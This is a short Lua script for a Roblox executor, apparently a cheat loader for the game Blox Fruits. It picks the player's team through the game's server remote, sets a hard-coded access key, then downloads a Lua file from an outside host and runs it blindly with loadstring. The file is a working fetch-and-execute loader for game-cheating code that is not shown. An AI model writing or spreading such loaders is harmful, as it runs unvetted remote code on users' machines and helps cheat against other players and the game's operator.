repeat task.wait(0.5) until game:IsLoaded()
    and game.Players.LocalPlayer
    and game.Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui")

local team = getgenv().ChooseTeam
if team ~= "Pirates" and team ~= "Marines" then
    team = "Pirates"
end
getgenv().ChooseTeam = team

while not game.Players.LocalPlayer.Character
   or not game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") do

    local Remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 10)

    if Remotes then
        local CommF = Remotes:WaitForChild("CommF_", 10)

        if CommF then
            CommF:InvokeServer("SetTeam", team)
        end
    end

    task.wait(1)
end

task.wait(0.5)

ACTIVE_KEY = "5c4965bbf469ca914edb8395bd5a2b50"

local res = http_request({
    Url = "https://api.luaw.dev/files/v2/loaders/6mss1famhjy2gasnw5w481j8b9yr42ji.lua",
    Method = "GET"
})

loadstring(res.Body)()
